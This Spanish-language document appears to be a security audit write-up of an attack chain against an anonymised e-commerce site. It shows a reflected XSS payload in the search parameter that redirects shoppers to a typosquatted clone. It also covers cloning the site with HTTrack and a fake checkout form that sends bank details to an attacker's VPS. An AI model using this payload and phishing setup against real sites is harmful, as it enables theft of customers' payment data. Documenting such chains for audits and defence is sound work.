# Cadena de Ataque: XSS Reflejado + Clonación de Sitio

## 🎯 Objetivo de la Auditoría
Demostrar cómo un atacante puede aprovechar vulnerabilidades en un sitio web legítimo (Cross-Site Scripting o Open Redirect) para redirigir tráfico a un sitio de phishing idéntico.

**Target:** Plataforma de E-Commerce Minorista (Anonimizado: "Retailer-X").

---

## ⚔️ Flujo del Ataque

### 1. Reconocimiento de Vulnerabilidad
Se detectó que el buscador interno del sitio web de "Retailer-X" era vulnerable a **Reflected XSS**. El sitio no sanitizaba correctamente los parámetros de entrada en la URL.

* **URL Vulnerable:** `https://retailer-x.com/search?q=<script>...`

### 2. Armado del Enlace Malicioso (The Hook)
En lugar de enviar un link extraño (`mitienda-fake.com`), se envía un link que **empieza con el dominio legítimo** de la víctima. Esto engaña a los usuarios y a los filtros de seguridad básicos.

**Payload Inyectado:**
```javascript
<script>window.location="[https://retailer-x-ofertas.online/producto-iphone15.html](https://retailer-x-ofertas.online/producto-iphone15.html)"</script>
URL Final (Codificada): La víctima ve retailer-x.com al inicio, lo que genera confianza inmediata. https://retailer-x.com/search?q=%3Cscript%3Ewindow.location%3D%22https%3A%2F%2Fretailer-x-ofertas.online%2F...

3. Infraestructura de Phishing (Clonación)
Dominio: Se registró un dominio Typosquatting (.online) muy similar al original.

Clonación: Se utilizó HTTrack o clonación manual de HTML/CSS para replicar exactamente la página de un producto de alto valor.

Flujo de Compra Falso:

producto.html (Idéntico al original).

carrito.html (Simulación de compra).

pago.html (Formulario malicioso que apunta al VPS del atacante).

4. Ejecución
La víctima hace clic en el enlace que parece legítimo (retailer-x.com).

El sitio legítimo ejecuta el XSS y redirige automáticamente al sitio clonado.

La víctima "compra" el producto e introduce sus datos bancarios.

Los datos viajan al VPS (post.php) y se guardan en texto plano
